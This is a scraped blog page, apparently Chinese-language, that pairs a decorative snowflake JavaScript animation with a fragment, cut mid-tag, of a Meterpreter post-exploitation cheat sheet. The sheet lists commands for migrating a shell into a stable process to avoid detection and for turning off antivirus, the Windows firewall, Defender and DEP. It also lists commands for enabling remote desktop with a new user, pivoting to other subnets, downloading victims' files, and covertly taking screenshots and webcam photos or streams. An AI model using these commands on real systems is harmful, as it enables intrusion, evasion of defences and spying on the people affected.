<script>
    //创建雪花元素
    function snow() {
      //获取视窗的宽高
      var width = window.innerWidth;
      var height = window.innerHeight;
  
      var snow = document.createElement("div");             //创建元素
  
      //初始化雪花样式
      size = Math.random() * 15 + 10;                          //随机生成雪花大小
      snow.style.width = size + "px";
      snow.style.height = size + "px";
      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
      // snow.style.background = "url(./雪花.png) no-repeat";
      snow.style.backgroundSize = '100% 100%';
      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
      snow.style.top = "10px";
      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
  
      //向body添加元素
      document.body.appendChild(snow);
  
      //创建定时器，每30ms雪花下落一次
      var timer = setInterval(function () {
        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
  
        //当雪花到达底部后清除元素
        if (parseInt(snow.style.top) >= height) {
          clearInterval(timer);
          snow.parentNode.removeChild(snow)
        }
      }, 30)
    }
  
    //页面加载完成执行函数
    window.onload = function play() {
      //创建定时器，每300ms生成一朵雪花
      setInterval(function () {
        snow()
      }, 300)
    }
  </script>

lass="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">进程迁移</span><br><span class="line">获得shell时，该shell是极其脆弱，所以需要移动这个shell把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样使渗透更难被检测到</span><br><span class="line"></span><br><span class="line">获取目标机正在运行的进程：ps</span><br><span class="line"></span><br><span class="line">输入getpid命令查看shell的进程号（pid），然后根据进程号对应ps命令查出来的name</span><br><span class="line"></span><br><span class="line">查看shell的进程号：getpid</span><br><span class="line"></span><br><span class="line">输入migrate 448命令把shell移动到pid为448的exe进程里，因为该进程是一个稳定的应用，完成进程迁移后，再次输入getpid命令查看shell的进程号</span><br><span class="line"></span><br><span class="line">把shell进程迁移到（<span class="attribute">pid</span>=448）的进程里：migrate 448</span><br><span class="line"></span><br><span class="line">完成后，原先shell的进程会自动关闭，如果没有自动关闭可以输入 kill 984杀死该进程</span><br><span class="line"></span><br><span class="line">手动关闭（<span class="attribute">pid</span>=984）进程：kill 984</span><br><span class="line"></span><br><span class="line">!!!!!!!!!自动迁移进程命令（<span class="built_in">run</span> post/windows/manage/migrate）后，系统会自动寻找合适的进程然后迁移</span><br><span class="line"></span><br><span class="line">自动寻找合适的进程迁移：<span class="built_in">run</span> post/windows/manage/migrate</span><br><span class="line"></span><br><span class="line">系统命令</span><br><span class="line">获得稳定的进程后，接下来收集系统信息</span><br><span class="line"></span><br><span class="line">查看目标机的系统信息      sysinfo</span><br><span class="line">检查目标机是否正在运行（最近的运行时间）  idletime</span><br><span class="line">查看目标机完整的网络设置    <span class="built_in">	route</span></span><br><span class="line"><span class="built_in"></span>将当前会话放到后台      background</span><br><span class="line">查看当前目标机上已经渗透成功的用户名  getuid</span><br><span class="line">关闭目标机系统杀毒软件     <span class="built_in">run</span> post/windows/manage/killav</span><br><span class="line">启动远程桌面协议（3389）     <span class="built_in">run</span> post/windows/manage/enable_rdp</span><br><span class="line">查看目标机的本地子网情况     <span class="built_in">run</span> post/windows/manage/autoroute</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以借助被攻陷的主机对其他网络进行攻击：</span><br><span class="line"></span><br><span class="line">添加路由        <span class="built_in">	route </span><span class="built_in">add</span> 192.168.43.0 255.255.255.0</span><br><span class="line">查看路由情况       <span class="built_in">	route </span><span class="built_in">print</span></span><br><span class="line">列举当前那些用户登陆目标机    <span class="built_in">run</span> post/windows/gather/enum_logged_on_users</span><br><span class="line">列举安装在目标机上的应用程序    <span class="built_in">run</span> post/windows/gather/enum_applications</span><br><span class="line">获取目标机器的分区情况     <span class="built_in">run</span> post/windows/gather/forensics/enum_drives</span><br><span class="line">检查目标机是否运行在虚拟机上    <span class="built_in">run</span> post/windows/gather/checkvm</span><br><span class="line">开启服务         <span class="built_in">run</span> post/windows/gather/enum_services</span><br><span class="line">查看共享         <span class="built_in">run</span> post/windwos/gather/enum_shares</span><br><span class="line">获取主机最近的系统操作     <span class="built_in">run</span>	post/windows/gather/dumplinks</span><br><span class="line">查看补丁         <span class="built_in">run</span>	post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">几个好玩的命令：</span><br><span class="line"></span><br><span class="line">对远程主机当前屏幕进行截图    screenshot</span><br><span class="line">查看目标机有没有摄像头     webcam_list</span><br><span class="line">打开目标机摄像头拍一张照片    webcam_snap</span><br><span class="line">开启直播模式        webcam_stream</span><br><span class="line">进入目标机的命令模式      shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件系统命令</span><br><span class="line">Meterpreter支持各种文件系统命令，用于搜索文件并执行各种任务</span><br><span class="line"></span><br><span class="line">pwd或getwd：查看当前处于目标机的哪个目录</span><br><span class="line">getlwd：查看当前处于本地的哪个目录</span><br><span class="line">ls：列出当前目录中的所有文件</span><br><span class="line">cd：切换目录</span><br><span class="line">search-f*.txt-d c: \：可以搜索C盘中所有以.txt为扩展名的文件，其中-f用于指定搜索文件模式，-d用于指定在哪个目录下进行搜索</span><br><span class="line">download C: \test.txt/root：下载目标机C盘的test.txt文件到攻击机root下</span><br><span class="line">upload/root/test.txt C:\：上传攻击机root目录下的test.txt文件到目标机C盘下</span><br><span class="line"></span><br><span class="line">上述可以使我们获得更多关于目标机的信息，当然还包含很多文件系统命令，需要我们去了解。</span><br><span class="line"></span><br><span class="line">后渗透攻击：权限提升</span><br><span class="line">在渗透测试的过程中很有可能只获得了一个系统的Guest或者User权限，低的权限级别使我们受到了很多的限制，在实施横向渗透或者提权攻击时很困难，在主机上如果没有管理员权限，就无法进行获取Hash、安装软件、修改防火墙规则和修改注册表等各种操作，所以必须将访问权限从Guest提升到User再到admin最后到System级别，渗透的目的是获取服务器的最高权限，也就是Windows的管理员账号或linux的root权限。</span><br><span class="line"></span><br><span class="line">提升权限的方式</span><br><span class="line">纵向提权：低权限A获得高权限B的权限也称为权限升级</span><br><span class="line">横向提权：获取同级别的权限，通过系统A获取了系统B的权限</span><br><span class="line"></span><br><span class="line">后渗透攻击：关闭杀软</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line">关闭Denfender：</span><br><span class="line">net stop windefend</span><br><span class="line">关闭DEP：</span><br><span class="line">bcdedit.exe/set&#123;current&#125;nx alwaysoff</span><br><span class="line">关闭杀毒软件：</span><br><span class="line"><span class="built_in">run</span> killav</span><br><span class="line"><span class="built_in">run</span> post/windows/manage/killava</span><br><span class="line"></span><br><span class="line">后渗透攻击：远程连接</span><br><span class="line">开启远程桌面：</span><br><span class="line"><span class="built_in">run</span> post/windows/manage/enable_rdp</span><br><span class="line"><span class="built_in">run</span> getgui -e</span><br><span class="line">开启远程桌面并添加一个新用户：</span><br><span class="line"><span class="built_in">run</span> getgui -u xxx -p ean</span><br><span class="line">开启远程桌面并绑定在8888端口：</span><br><span class="line"><span class="built_in">run</span> getgui -e -f 8888</span><br><span class="line">截图：</span><br><span class="line">load espia</span><br><span class="line">screengrab</span><br><span class="line"></span><br><span class="line">whoami/groups：查看当前的权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
